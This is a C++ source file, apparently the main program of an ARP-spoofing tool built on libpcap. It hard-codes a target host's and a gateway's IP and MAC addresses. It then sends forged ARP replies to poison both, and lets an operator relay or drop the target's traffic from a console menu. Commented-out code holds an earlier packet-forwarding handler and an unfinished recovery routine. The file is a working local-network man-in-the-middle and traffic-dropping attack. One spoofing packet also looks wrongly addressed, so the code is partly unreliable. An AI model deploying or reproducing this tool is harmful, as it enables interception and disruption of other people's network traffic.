#include "arp_spoofer_lib/headers/AdapterQuery.h"
#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/ARPSpoofing.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

#include <iostream>
#include <ncurses.h>

using std::cin, std::cout, std::endl;

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

u_char target_ip[4] = IP_ARRAY(192, 168, 43, 171);
u_char target_mac[6] = MAC_ARRAY(9c, b6, d0, b9, 1a, 0f);

u_char gateway_ip[4] = IP_ARRAY(192, 168, 43, 1);
u_char gateway_mac[6] = MAC_ARRAY(22, 47, da, 58, 88, 8c);

u_char self_ip[4] = IP_ARRAY(192, 168, 43, 215);
u_char self_mac[6] = MAC_ARRAY(58, 91, CF, 98, 7B, FF);

u_char broadcast_ip[4] = IP_ARRAY(0, 0, 0, 0);
u_char broadcast_mac[6] = MAC_ARRAY(FF, FF, FF, FF, FF, FF);

int main() {
    cout << "sizeof(arp_packet): " << sizeof(arp_packet) << endl;
    string dev_name = list_dev_and_choose_dev();
    pcap_t *adapter = open_adapter(dev_name);

    char filter_buf[PCAP_ERRBUF_SIZE];
    bpf_program bpf;
    sprintf(filter_buf, "ether host %02x:%02x:%02x:%02x:%02x:%02x",
            EXPAND_MAC(target_mac));

#ifdef DEBUG
    printf("filter buf: %s\n", filter_buf);
#endif

    // compile bpf filter
    if (pcap_compile(adapter, &bpf, filter_buf,
                     1, PCAP_NETMASK_UNKNOWN) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "compiling BPF filter");
        pcap_close(adapter);
        return -1;
    }

    // set bpf filter on adapter
    if (pcap_setfilter(adapter, &bpf) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "setting BPF filter");
        pcap_close(adapter);
        return -1;
    }

    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                target_ip, target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_ip, self_mac,
                                                                 target_ip, target_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);

    // TODO: Add ARP recovering

    PacketHandler pkt_h(adapter, self_mac,
                        target_mac, gateway_mac, target_ip);

    string cmd;
    while (cin >> cmd) {
        if (cmd == "so") {
            target_spoofer.start();
            gateway_spoofer.start();
        }
        if (cmd == "sf") {
            target_spoofer.stop();
            gateway_spoofer.stop();
        }
        if (cmd == "ex") {
            target_spoofer.stop();
            gateway_spoofer.stop();
            pkt_h.stop();
            pkt_h.stop();
            pcap_close(adapter);
            return 0;
        }
        if (cmd == "po")
            pkt_h.start();
        if (cmd == "pf")
            pkt_h.stop();
        if (cmd == "do")
            pkt_h.set_drop_packet(true);
        if (cmd == "df")
            pkt_h.set_drop_packet(false);
    }
//
//    int choose;
//    scanf("%d",&us);
//
//    if (true) {
//        pthread_t tid;
//        pthread_create(&tid, nullptr, &arp_spoofing, nullptr);
//
//        //start the capture
//        pcap_loop(adapter, 0, packet_handler, NULL);
//
//        pcap_close(adapter);
//        getchar();
//    }
//    else if (choose==2)
//    {
//        arp_recover(nullptr);
//    }

    return 0;
}

/* Callback function invoked by libpcap for every incoming packet */
//void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
//    struct tm ltime;
//    char timestr[16];
//    ethernet_header *eh;
//    ip_header *ih;
//
//    /*
//     * Unused variable
//     */
//    (void) (param);
//
//    eh = (ethernet_header *) pkt_data;
//
//    // Make latency
//    usleep(us);
//
//    if (eh->type == htons(0x0800))    // IPv4 is 0x0800
//    {
//        /* retireve the position of the ip header */
//        ih = (ip_header *) (pkt_data +
//                            sizeof(ethernet_header)); //length of ethernet heade
//        if (!memcmp((void *) &ih->daddr, dst_ip, 4)) {
//            printf("To Target:\t%d%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, dst_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//
//        } else if (!memcmp((void *) &ih->saddr, dst_ip, 4)) {
//            printf("From Target:\t%d.%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, gateway_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//            if (pcap_sendpacket(adapter,                                // Adapter
//                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
//                            header->len                             // size
//            ) != 0)
//                fprintf(stderr, "\nError sending the Retrans_packet to : %s\n", pcap_geterr(adapter));
//        }
//    }
//}
//
//
//void *arp_spoofing(void *arg) {
//}

//void *arp_recover(void *arg) {
//    while (true) {
//        // Send down the deceive_dst_packet
//        if (pcap_sendpacket(adapter,                                 // Adapter
//                            (const u_char *) &recover_dst_packet,    // buffer with the deceive_dst_packet
//                            sizeof(recover_dst_packet)               // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        if (pcap_sendpacket(adapter,                                        // Adapter
//                            (const u_char *) &recover_gateway_packet,       // buffer with the deceive_dst_packet
//                            sizeof(recover_gateway_packet)                  // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        sleep(1);
//    }
//}

